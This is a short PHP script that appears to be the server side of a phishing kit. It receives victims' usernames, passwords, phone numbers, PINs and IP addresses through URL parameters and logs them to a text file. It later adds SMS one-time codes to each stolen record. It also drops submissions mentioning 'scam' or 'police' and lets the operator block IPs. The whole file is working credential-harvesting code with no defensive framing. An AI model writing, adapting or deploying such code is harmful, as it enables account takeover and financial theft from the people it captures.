<?php
$now = time();
$main = @$_GET['main'];
$sms = @$_GET['sms'];
$block = @$_GET['block'];
$blockedfile = 'blocked.txt';
if ($block != "") {
	$ip = $_GET['block'];
	$h = fopen($blockedfile,'a');
	fwrite($h,$ip);
	fwrite($h,"\r\n");
	fclose($h);
	print "$ip added to block list. No more input from this hostname will be allowed";
	die();
}
$file = file('srv1log.txt');
$filepath = 'srv1log.txt';
function getLineWithString($file, $str) {
	$retVal = "";
    foreach ($file as $lineNumber => $line) {
        if (strpos($line, $str) !== false) {
        	$retVal = "$lineNumber#$line";
        }
    }
    if( $retVal == ""){
	    return -1;
    }
    return $retVal;
}
function checkblock($ip) {
	global $blockedfile;
	$blocked = file("$blockedfile");
	foreach ($blocked as $oneip) {
	$oneip = rtrim($oneip);
	if ($oneip == $ip) {
	die("Error 0");
	} 
}
}
if ($main != "")  {
	$info = explode(',',"$main");
	$user = $info[0];
	$pass = $info[1];
	$phone = $info[2];
	$pin = $info[3];
	$ip = $info[4];
    checkblock($ip);
	if (strpos($user,'fuck') !== false || strpos($user,'shit') !== false || strpos($user,'police') !== false || 
	strpos($user,'dumb') !== false || strpos($user,'scam') !== false || strpos($user,'idiot') !== false || strpos($user,'asshole') !== false || strpos($user,'penis') !== false)
	{ die(""); }
	if (strpos($pass,'fuck') !== false || strpos($pass,'shit') !== false || strpos($pass,'police') !== false || 
	strpos($pass,'dumb') !== false || strpos($pass,'scam') !== false || strpos($pass,'idiot') !== false || strpos($pass,'asshole') !== false || strpos($pass,'penis') !== false)
	{ die(""); }
	
    $linenumberanddata = getLineWithString($file,"$user");
	if ($linenumberanddata == "-1") { 
    $fp = fopen('srv1log.txt', 'a');
	fwrite($fp, "\r\n");
    fwrite($fp, "$now#$phone#$user#$pass##$pin##$ip#");
    fclose($fp);
	}
	else {
    die("Error1");		
}
}
elseif ($sms != "") {
	$info = explode(',',"$sms");
	$phone = $info[0];
	$sms = $info[1];
	$linenumberanddata = getLineWithString($file,"$phone");
	if ($linenumberanddata == "-1") { 
	die("Error2");
	}
	else {
	$theline = explode("#","$linenumberanddata");
	$line_i_am_looking_for = $theline[0];
    $time = $theline[1];
    $user = $theline[3];
    $pass = $theline[4];
    $pin = $theline[6];
    $reason = $theline[7];
    $ip = $theline[8];
	$lines = file( $filepath , FILE_IGNORE_NEW_LINES );
    $lines[$line_i_am_looking_for] = "$now#$phone#$user#$pass#$sms#$pin#$reason#$ip#";
    file_put_contents( $filepath , implode( "\r\n", $lines ));;
	}
} 
else { 
  die('Error3'); 
}